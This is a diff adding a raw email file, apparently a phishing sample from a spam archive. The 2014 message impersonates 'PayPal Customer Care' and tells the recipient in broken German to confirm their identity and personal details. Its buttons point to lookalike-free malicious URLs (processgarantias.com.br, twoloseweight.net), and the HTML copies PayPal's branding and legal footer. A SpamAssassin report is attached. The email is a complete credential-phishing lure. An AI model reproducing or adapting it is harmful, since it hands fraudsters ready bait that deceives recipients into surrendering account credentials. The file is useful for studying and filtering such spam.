@@ -1,0 +1,760 @@
+X-Account-Key: account2
+X-UIDL: 50ab8dc50005f7e3
+X-Mozilla-Status: 0001
+X-Mozilla-Status2: 00000000
+X-Mozilla-Keys:                                                                                 
+Return-Path: <jeansfitch@enom441.com>
+X-Original-To: ianni@mat.unical.it
+Delivered-To: ianni@mat.unical.it
+Received: from localhost (ml [127.0.0.1])
+	by ml.mat.unical.it (Postfix) with ESMTP id EE32A18D0139
+	for <ianni@mat.unical.it>; Wed, 24 Sep 2014 11:08:05 +0200 (CEST)
+X-Virus-Scanned: Debian amavisd-new at mat.unical.it
+X-Spam-Flag: NO
+X-Spam-Score: 0.904
+X-Spam-Level: 
+X-Spam-Status: No, score=0.904 required=2.1 tests=[BAYES_00=-1.9,
+	FSL_HELO_BARE_IP_2=0.214, HTML_MESSAGE=0.001, RCVD_NUMERIC_HELO=1.164,
+	TVD_FROM_1=1, URIBL_GREY=0.424, URIBL_RED=0.001] autolearn=no
+Received: from ml.mat.unical.it ([127.0.0.1])
+	by localhost (ml.mat.unical.it [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id 8iuJ0pmJ9AEa for <ianni@mat.unical.it>;
+	Wed, 24 Sep 2014 11:08:02 +0200 (CEST)
+Received: from wagner.kr.tuwien.ac.at (wagner.kr.tuwien.ac.at [128.130.205.32])
+	by ml.mat.unical.it (Postfix) with ESMTPS id DC73018D00A7
+	for <ianni@mat.unical.it>; Wed, 24 Sep 2014 11:08:01 +0200 (CEST)
+Received: from 118.69.52.114 ([118.69.52.114])
+	by wagner.kr.tuwien.ac.at (8.14.5/8.14.5/SuSE Linux 0.8) with SMTP id s8O8eC53021276
+	for <ianni@kr.tuwien.ac.at>; Wed, 24 Sep 2014 10:40:17 +0200
+Received: from unknown (HELO smum5) ([191.143.205.62])
+	by 118.69.52.114 with ESMTP; Wed, 24 Sep 2014 15:38:55 +0700
+Message-ID: <002d01cfd7d2$b655bd10$bf8fcd3e@pc16smum5>
+From: "Paypal Customer Care" <jeansfitch@enom441.com>
+To: <ianni@kr.tuwien.ac.at>
+Subject: Aktualisieren Sie Ihre Account-Informationen
+Date: Wed, 24 Sep 2014 15:33:01 +0700
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----------=_1411548018-32256-154"
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2800.1437
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1437
+X-Scanned-By: MIMEDefang 2.74 on 128.130.205.32
+Status:   
+
+This is a multi-part message in MIME format...
+
+------------=_1411548018-32256-154
+Content-Type: text/html;
+	format=flowed;
+	charset="iso-8859-1";
+	reply-type=original
+Content-Transfer-Encoding: 7bit
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<!--To read this email in a web browser please open this URL: http://view.ed4.net/v/GYIG1XO/6VPW2L/V6C1XXW/D4PM4TI/MAILACTION=1&FORMAT=H -->
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+
+  <meta name="format-detection" content="telephone=no" />
+
+
+  <title>Be aware of changing conditions of use from your PayPal account</title>
+  <link rel="SHORTCUT ICON" href="http://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
+
+  <style type="text/css">
+ReadMsgBody width: 100%;	
+ExternalClass width: 100%;	
+
+applelinks a 	color:#bbbbbb !important;
+text-decoration:none !important;
+
+	
+@media screen and (max-device-width: 480px) 
+
+/* -------------------------------generic------------------------------- */
+table[class=nomob], span[class=nomob], td[class=nomob], img[class=nomob] 
+display:none !important;
+
+table[class=nobk], span[class=nobk], td[class=nobk], img[class=nobk] 
+background:none!important;
+
+table[class=email320resize], td[class=email320resize] 
+width:320px!important;
+
+table[class=email300resize], td[class=email300resize] 
+width:300px!important;
+margin: 0px 10px!important;
+
+/* -------------------------------shell------------------------------- */
+
+/* header */
+*[class=resize10width] 
+width: 10px!important;
+
+*[class=resize8width] 
+width: 8px!important;
+
+*[class=resize50width] 
+width: 50px!important;
+
+*[class=resize28height] 
+height: 28px!important;
+
+/*Images*/
+
+img[class=resize5] 
+width: 5px !important;
+
+img[class=resize8] 
+width: 8px !important;
+
+img[class=resize10] 
+width: 10px !important;
+
+img[class=resize50] 
+width: 50px !important;
+
+img[class=resize5h] 
+height: 5px !important;
+
+img[class=resize6h] 
+height: 6px !important;
+
+img[class=resize8h] 
+height: 8px !important;
+
+img[class=resize10h] 
+height: 10px !important;
+
+img[class=resize12h] 
+height: 12px !important;
+
+img[class=resize13h] 
+height: 13px !important;
+
+img[class=resize20h] 
+height: 20px !important;
+
+img[class=resize24h] 
+height: 24px !important;
+
+img[class=resize26h] 
+height: 26px !important;
+
+img[class=resize30h] 
+height: 30px !important;
+
+img[class=resize95]
+	width: 95px !important;
+	height:auto!important;
+
+
+img[class=resize17width]
+	width: 17px !important;
+
+
+img[class=resize280]
+	width: 280px !important;
+
+
+img[class=resize300]
+	width: 280px !important;
+	margin: 8px 0px 14px 0px!important;
+
+
+img[class=resize300hero1]
+	width: 300px !important;
+	height: auto!important;
+ 
+
+img[class=resize300hero2]
+	width: 300px !important;
+	height:150px!important;
+	background:url(https://image.paypal-communication.com/paypal/2012_Q2/PayPalEU_Mobile_Optimisation_Project_USD/html2/images/img_hero_nl_mobile.png) no-repeat!important;
+ 
+
+img[class=resize320]
+	width: 320px !important;
+
+
+
+/*BACKGROUND IMAGES*/
+
+td[class=smallDivider] 
+background:url(https://image.paypal-communication.com/paypal/2012_Q2/PayPalEU_Mobile_Optimisation_Project_USD/html/images/img_divider.gif)!important;
+background-position:top!important;
+background-repeat:no-repeat!important;
+width:280px!important;
+height: auto!important;
+margin-bottom: 15px!important;
+
+td[class=eduTop] 
+background:url(https://image.paypal-communication.com/paypal/2012_Q2/PayPalEU_Mobile_Optimisation_Project_USD/html/images/img_eduTopMOB.gif)!important;
+background-position:top!important;
+background-repeat:no-repeat!important;
+height:14px!important;
+width:280px!important;
+
+td[class=eduBottom] 
+background:url(https://image.paypal-communication.com/paypal/2012_Q2/PayPalEU_Mobile_Optimisation_Project_USD/html/images/img_eduBottomMOB.gif)!important;
+background-position:top!important;
+background-repeat:no-repeat!important;
+height:14px!important;
+width:280px!important;
+
+
+/*font sizes*/
+
+*[class=fontsize12]
+	font-size: 12px !important;
+	line-height: 16px !important;
+
+
+td[class=fontsize16]
+	font-size: 16px !important;
+	line-height: 19px !important;
+
+
+
+
+
+
+
+
+
+td[class=fontsize18]
+	font-size: 18px !important;
+	line-height: 21px !important;
+
+
+
+
+*[class=fontsize18blue]
+	font-size: 18px !important;
+	line-height: 21px !important;
+	color:#0079c1!important;
+	text-decoration:none!important;
+
+
+*[class=middlealign]
+	margin: 0 auto!important;
+
+
+
+
+/* footer */
+td[class=emailcolsplit280] 
+width:280px!important;
+float:left!important;
+
+td[class=emailcolsplit300] 
+width:290px!important;
+float:left!important;
+
+*[id=padding14bottom] 
+margin-bottom:16px!important;
+	
+*[id=padding14] 
+margin:16px 0px!important;
+
+*[class=resize11font] 
+font-size:11px!important;
+line-height: 15px!important;
+
+*[class=resize14height] 
+height: 14px!important;
+
+*[class=resize14font] 
+font-size:14px!important;
+line-height: 18px!important;
+
+
+/* CTA */
+*[class=footer300cta] 
+font-size: 14px!important;
+color:#FFF!important;
+width:280px!important;
+float:left!important;
+text-align:center!important;
+margin: 0px 0px 4px 0px!important;
+padding: 2px 0px 2px 0px!important;
+border: 0px!important;
+border-radius: 10px !important;
+background-color:#0079c1 !important;
+
+
+*[class=blueband78width] 
+width: 78px!important;
+height: auto!important;
+margin: 12px  0px!important;
+
+
+  </style>
+  <link rel="SHORTCUT ICON" href="" />
+
+  <meta name="viewport" content="width=320" />
+
+  <meta http-equiv="Content-Type" content="text/html; charset=windows-1252" />
+</head>
+
+
+
+
+<body style="margin: 0pt; padding: 0pt;" bgcolor="#ffffff">
+<div style="margin: 0pt; padding: 0pt; background: rgb(255, 255, 255) none repeat scroll 0%; -moz-background-clip: initial; -moz-background-origin: initial; -moz-background-inline-policy: initial;">
+
+<table bgcolor="#ffffff" border="0" cellpadding="0" cellspacing="0" height="100%" width="100%">
+
+  <tbody>
+    <tr>
+
+    <td align="center" valign="top">
+      
+      <table class="email320resize" border="0" cellpadding="0" cellspacing="0" width="640">
+
+        <tbody>
+          <tr>
+
+          <td align="left" valign="top">
+            <table class="email300resize" style="background-repeat: no-repeat;" background="https://image.paypal-communication.com/paypal/2012_Q2/PayPalEU_Mobile_Optimisation_Project_USD/html/shell/img_header_bk_v2.gif" bgcolor="#565559" border="0" cellpadding="0" cellspacing="0" width="100%">
+
+            <tbody>
+                <tr>
+
+                  <td class="resize10width" align="left" valign="top" width="35"><img class="resize10width" style="display: block;" src="http://img.ed4.net/spacer50.gif" border="0" height="1" width="35" /></td>
+
+              <td align="right" valign="top">
+                  <table border="0" cellpadding="0" cellspacing="0">
+
+                <tbody>
+                      <tr>
+
+          <td align="left" valign="top"><img src="http://img.ed4.net/spacer50.gif" style="display: block;" height="12" width="1" /></td>
+
+                </tr>
+
+                <tr>
+
+                  <td style="font-family: Arial,Helvetica,sans-serif; color: rgb(187, 187, 187); font-size: 11px; text-decoration: none; line-height: 16px; font-weight: normal;" align="right" valign="top"> Sorry, <span class="nomob">We are having problems  with e-mails</span><br />
+
+
+so if the e-mail does not display correctly, please click on
+ <a href="https://email-edg.paypal.com" style="font-family: Arial,Helvetica,sans-serif; color: rgb(187, 187, 187); font-size: 11px; text-decoration: underline; line-height: 16px; font-weight: normal;" target="_blank"><span><font style="font-family: Arial,Helvetica,sans-serif; color: rgb(187, 187, 187); font-size: 11px; 
+text-decoration: underline; line-height: 16px; font-weight: normal;"><strong> display images </strong></font></span></a><br />
+
+
+                        <span class="nomob">Consider adding the address </span> <span class="nomob"><a href="maitlo:paypal@e.paypal.fr" style="font-family: Arial,Helvetica,sans-serif; color: rgb(187, 187, 187); font-size: 11px; text-decoration: none; line-height: 16px; font-weight: normal;"><span><font style="font-family: 
+Arial,Helvetica,sans-serif; color: rgb(187, 187, 187); font-size: 11px; text-decoration: none; line-height: 16px; font-weight: normal;">paypal@e.paypal.us</font></span></a></span> <span class="nomob">to your contact list so our newsletters are not classified as spam. 
+ We apolgize for the inconvenience and are actively working to resolve this issue as quickly as possible, 
+PayPal Security</span></td>
+
+                </tr>
+
+                <tr>
+
+          <td align="left" valign="top"><img src="http://img.ed4.net/spacer50.gif" style="display: block;" height="12" width="1" /></td>
+
+                </tr>
+
+              
+                    </tbody>
+                  </table>
+                  </td>
+
+                <td class="resize10width" align="left" valign="top" width="35"><img class="resize10width" style="display: block;" src="http://img.ed4.net/spacer50.gif" border="0" height="1" width="35" /></td>
+
+            </tr>
+
+          
+              </tbody>
+            </table>
+
+            
+
+  
+
+
+
+
+            <table id="yiv20903103emailWrapperTable" style="font-style: normal; font-variant: normal; font-weight: normal; font-size: 11px; font-family: Verdana,Arial,Helvetica,sans-serif; color: rgb(51, 51, 51);" border="0" cellpadding="0" cellspacing="0" width="580">
+
+
+  <tbody id="yui_3_2_0_1_1331926537557240">
+
+
+    <tr id="yui_3_2_0_1_1331926537557273" valign="top">
+
+
+      <td id="yui_3_2_0_1_1331926537557272" colspan="3">
+      
+                  <table id="yui_3_2_0_1_1331926537557271" border="0" cellpadding="0" cellspacing="0" width="100%">
+
+
+        <tbody id="yui_3_2_0_1_1331926537557270">
+
+
+          <tr id="yui_3_2_0_1_1331926537557269" valign="top">
+
+
+            <td id="yui_3_2_0_1_1331926537557268"> <a id="yui_3_2_0_1_1331926537557277" rel="nofollow" target="_blank" href="https://www.paypal.com/cy"> <img id="yui_3_2_0_1_1331926537557274" src="http://images.paypal.com/en_US/i/logo/logo_emailheader_113wx46h.gif" alt="PayPal" border="0" /></a></td>
+
+
+          </tr>
+
+
+          <tr>
+
+
+            <td> <img alt="" src="http://images.paypal.com/en_US/i/scr/pixel.gif" border="0" height="10" width="1" /></td>
+
+
+          </tr>
+
+
+          <tr>
+
+
+            <td>&nbsp;</td>
+
+
+          </tr>
+
+
+        
+                    </tbody>
+      
+                  </table>
+
+
+      </td>
+
+
+    </tr>
+
+
+    <tr>
+
+
+      <td colspan="3"> <img src="http://images.paypal.com/en_US/i/scr/scr_emailTopCorners_580wx13h.gif" style="vertical-align: bottom;" alt="" border="0" height="13" /></td>
+
+
+    </tr>
+
+
+    <tr id="yui_3_2_0_1_1331926537557239">
+
+
+      <td style="border-left: 1px solid rgb(221, 221, 221); background: transparent none repeat-y scroll left center; -moz-background-clip: initial; -moz-background-origin: initial; -moz-background-inline-policy: initial;" width="12"> <img src="http://images.paypal.com/en_US/i/scr/pixel.gif" alt="" border="0" /></td>
+
+
+      <td id="yui_3_2_0_1_1331926537557238" class="yiv20903103contentArea" style="margin: 0pt; padding: 12px; width: 530px;" width="530">
+      
+                  <table style="font-style: normal; font-variant: normal; font-weight: normal;" width="100%">
+
+
+        <tbody>
+
+
+          <tr>
+
+
+            <td>
+            
+                        <h2> <span style="font-weight: bold; color: rgb(200, 128, 57); font-size: 15px;">
+Aktualisieren Sie Ihre Account-Informationen</span></h2>
+
+
+            </td>
+
+
+          </tr>
+
+
+        
+                    </tbody>
+      
+                  </table>
+
+
+      
+                  <p>&nbsp;</p>
+
+
+      
+                  <p>Sehr geehrter benutzer,</p>
+
+
+      
+                  <p>Ihr Konto wurde von eine andere IP adresse angeschaut wie ublich.<br />
+
+
+Deswegen sind Sie eingeladen Ihre personliche information zu eingeben und Ihre Identitat zu Bestatigen.</p>
+
+
+      
+                  <p><span style="font-weight: bold;"></span><span style="text-decoration: underline;"><span style="font-weight: bold;">Was muBen Sie machen? :</span></span>
+      </p>
+
+
+      
+                  <ol>
+
+
+        <li>Drucken Sie auf den Link um einen neuen Browser fenster zu offnen.</li>
+
+
+        <li>Sie muBen destatigen das es Ihr Konto ist.</li>
+
+
+        <li>Bestatigen Sie alle information</li>
+
+
+        <li>Benuzen Sie ihr Konto wie ublich</li>
+
+
+      
+                  </ol>
+
+
+      
+                  <table id="yui_3_2_0_1_1331926537557253" class="yiv20903103callToAction" style="margin: 0pt 0pt 10px; font-style: normal; font-variant: normal; font-weight: normal; font-size: 11px; font-family: Verdana,Arial,Helvetica,sans-serif;" border="0" cellpadding="0" cellspacing="0">
+
+
+        <tbody id="yui_3_2_0_1_1331926537557250">
+
+
+          <tr id="yui_3_2_0_1_1331926537557247">
+
+
+   <td id="yui_3_2_0_1_1331926537557244" style="border-style: solid; border-color: rgb(191, 191, 191) rgb(144, 141, 141) rgb(144, 141, 141) rgb(191, 191, 191); border-width: 1px; margin: 0pt; padding: 1px 10px;" bgcolor="#ffa822"> <a id="yui_3_2_0_1_1331926537557241" rel="nofollow" style="text-decoration: none; color: rgb(0, 0, 
+0);" target="_blank" href="http://processgarantias.com.br/gim.html">Klicken Sie hier</a></td></tr>
+
+
+        
+                    </tbody>
+      
+                  </table>
+
+
+      
+                  <p>&nbsp;</p>
+
+
+      
+                  <table style="border-top: 1px solid rgb(238, 238, 238); border-bottom: 1px solid rgb(238, 238, 238); font-family: verdana; font-size: 12px; margin-bottom: 15px;" border="0" cellpadding="0" cellspacing="5" width="528">
+
+
+        <tbody>
+
+
+          <tr>
+
+
+            <td valign="top" width="89%">
+            
+                        <p style="margin: 0pt; padding-top: 5px;">If
+you didn't ask us for help with your password, <a target="_blank" href="http://twoloseweight.net/wp-content/al.html"> let us know
+right away</a>. Reporting it is important because it helps us
+prevent fraudsters from stealing your information.</p>
+
+
+            
+                        <p>&nbsp;</p>
+
+
+            </td>
+
+
+            <td valign="top" width="8%">
+            
+                        <table style="font-family: verdana; font-size: 12px;">
+
+
+              <tbody>
+
+
+                <tr>
+
+
+                  <td>
+                  
+                              <div>&nbsp;</div>
+
+
+                  </td>
+
+
+                </tr>
+
+
+              
+                          </tbody>
+            
+                        </table>
+
+
+            
+                        <p>&nbsp;</p>
+
+
+            
+                        <p>&nbsp;</p>
+
+
+            </td>
+
+
+          </tr>
+
+
+        
+                    </tbody>
+      
+                  </table>
+
+
+      
+                  <p>Yours sincerely,<br />
+
+
+PayPal Security Center</p>
+
+
+      </td>
+
+
+      <td style="border-right: 1px solid rgb(221, 221, 221); background: transparent none repeat-y scroll left center; -moz-background-clip: initial; -moz-background-origin: initial; -moz-background-inline-policy: initial;" width="12"> <img src="http://images.paypal.com/en_US/i/scr/pixel.gif" alt="" border="0" /></td>
+
+
+    </tr>
+
+
+    <tr>
+
+
+      <td colspan="3"> <img src="http://images.paypal.com/en_US/i/scr/scr_emailBottomCorners_580wx13h.gif" alt="" border="0" height="13" /></td>
+
+
+    </tr>
+
+
+  
+              </tbody>
+            </table>
+
+
+            <table id="yiv20903103emailFooter" style="font-style: normal; font-variant: normal; font-weight: normal; font-size: 10px; font-family: Verdana,Arial,Helvetica,sans-serif; color: rgb(51, 51, 51); padding-top: 20px;" border="0" cellpadding="0" cellspacing="0" width="580">
+
+
+  <tbody id="yui_3_2_0_1_1331926537557218">
+
+
+    <tr id="yui_3_2_0_1_1331926537557215">
+
+
+      <td id="yui_3_2_0_1_1331926537557212">
+      
+                  <div id="yui_3_2_0_1_1331926537557209" class="yiv20903103footerLinks" style="margin: 5px 0pt; padding: 0pt;"> <a rel="nofollow" target="_blank" href="https://www.paypal.com/cy/cgi-bin/helpweb?cmd=_help">
+Help Center</a><span style="color: rgb(204, 204, 204);">
+| </span> <a id="yui_3_2_0_1_1331926537557206" rel="nofollow" target="_blank" href="https://www.paypal.com/cy/security"> Security Center</a></div>
+
+
+      
+                  <p>Copyright &copy; 2013 PayPal. All rights reserved.<br />
+
+
+      <br />
+
+
+PayPal (Security Center) Cie &amp; S.C.A.<br />
+
+
+
+
+Registered office: 22-24 Boulevard Royal, L-2449 Luxemburg<br />
+
+
+RCS Luxemburg B 118 349</p>
+
+
+      <img src="https://paypal.112.2o7.net/b/ss/paypalglobal/1/H.22--NS/933845143?c6=1AN23570NC378661T&amp;v0=PP1478_0_&amp;pe=lnk_o&amp;pev1=email&amp;pev2=D=v0&amp;events=scOpen" alt="" border="0" height="1" width="1" />
+      
+                  <p class="yiv20903103xptFooter yiv20903103ppid">
+PayPal Email ID PP1478</p>
+
+
+      </td>
+
+
+    </tr>
+
+
+  
+              </tbody>
+            </table>
+
+
+            </td>
+          </tr>
+        </tbody>
+      </table>
+      </td>
+    </tr>
+  </tbody>
+</table>
+</div>
+</body>
+</html>
+
+
+------------=_1411548018-32256-154
+Content-Type: text/plain; name="SpamAssassinReport.txt"
+Content-Disposition: inline; filename="SpamAssassinReport.txt"
+Content-Transfer-Encoding: 7bit
+
+Spam detection software, running on the system "wagner.kr.tuwien.ac.at", has
+identified this incoming email as possible spam.  The original message
+has been attached to this so you can view it (if it isn't spam) or label
+similar future email.  If you have any questions, see
+postmaster for details.
+
+Content preview:  Be aware of changing conditions of use from your PayPal account
+   Sorry, We are having problems with e-mails so if the e-mail does not display
+   correctly, please click on display images Consider adding the address paypal@e.paypal.us
+   to your contact list so our newsletters are not classified as spam. We apolgize
+   for the inconvenience and are actively working to resolve this issue as quickly
+   as possible, PayPal Security Aktualisieren Sie Ihre Account-Informationen
+   [...] 
+
+Content analysis details:   (12.6 points, 5.0 required)
+
+ pts rule name              description
+---- ---------------------- --------------------------------------------------
+ 3.5 BAYES_99               BODY: Bayes spam probability is 99 to 100%
+                            [score: 1.0000]
+ 0.0 TVD_RCVD_IP4           Message was received from an IPv4 address
+ 0.0 TVD_RCVD_IP            Message was received from an IP address
+ 1.0 TVD_FROM_1             From address appears to be a throwaway domain
+ 3.3 RCVD_IN_PBL            RBL: Received via a relay in Spamhaus PBL
+                            [118.69.52.114 listed in zen.spamhaus.org]
+ 1.2 RCVD_NUMERIC_HELO      Received: contains an IP address used for HELO
+ 0.0 URIBL_RED              Contains an URL listed in the URIBL redlist
+                            [URIs: twoloseweight.net]
+ 0.4 URIBL_GREY             Contains an URL listed in the URIBL greylist
+                            [URIs: ed4.net]
+ 0.2 BAYES_999              BODY: Bayes spam probability is 99.9 to 100%
+                            [score: 1.0000]
+ 0.0 HTML_MESSAGE           BODY: HTML included in message
+ 0.7 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
+ 1.4 RCVD_IN_BRBL_LASTEXT   RBL: RCVD_IN_BRBL_LASTEXT
+                            [118.69.52.114 listed in bb.barracudacentral.org]
+ 0.8 RDNS_NONE              Delivered to internal network by a host with no rDNS
+ 0.0 FORGED_OUTLOOK_HTML    Outlook can't send HTML message only
+ 0.0 FSL_HELO_BARE_IP_2     FSL_HELO_BARE_IP_2
+
+
+
+------------=_1411548018-32256-154--
+
